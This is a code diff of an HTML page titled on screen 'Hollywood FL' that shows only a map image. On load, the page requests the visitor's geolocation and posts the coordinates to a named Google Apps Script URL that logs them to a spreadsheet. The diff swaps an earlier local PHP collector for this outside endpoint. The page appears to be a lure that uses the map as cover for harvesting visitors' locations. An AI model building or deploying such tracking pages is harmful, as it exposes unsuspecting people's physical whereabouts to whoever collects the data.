@@ -3,11 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>House</title>
+    <title>Send Location to Google Sheets</title>
 </head>
 <body>
     <h1>Hollywood FL</h1>
     <img src="united-states-of-america-detailed-country-map-template-free-vector.jpg" alt="" style="width: 100%; height: 100%;">
+
     <script>
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -15,20 +16,33 @@
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
 
-                    // Dërgimi i të dhënave në server me POST
-                    fetch('php.php', {
+                    // Replace with your Google Apps Script Web App URL
+                    const scriptURL = "https://script.google.com/macros/s/AKfycbyaXUTniADavPxth8_pMdM1sv1_eg2Qa5r7OOxTtyOEHjh_YO6WV1uct1r5WrJn-Lj4Fg/exec";
+
+                    // Send geolocation data to Google Sheets
+                    fetch(scriptURL, {
                         method: 'POST',
                         headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'Content-Type': 'application/json',
                         },
-                        body: `latitude=${latitude}&longitude=${longitude}`
+                        body: JSON.stringify({
+                            latitude: latitude,
+                            longitude: longitude,
+                        })
                     })
                     .then(response => response.text())
-                    .then(data => alert(data))
-                    .catch(error => console.error("Error:", error));
+                    .then(data => {
+                        alert("Location sent successfully!");
+                        console.log("Server response:", data);
+                    })
+                    .catch(error => {
+                        console.error("Error:", error);
+                        alert("Failed to send location.");
+                    });
                 },
                 (error) => {
-                    console.error("Error obtaining location", error);
+                    console.error("Error obtaining location:", error);
+                    alert("Unable to get your location.");
                 }
             );
         } else {
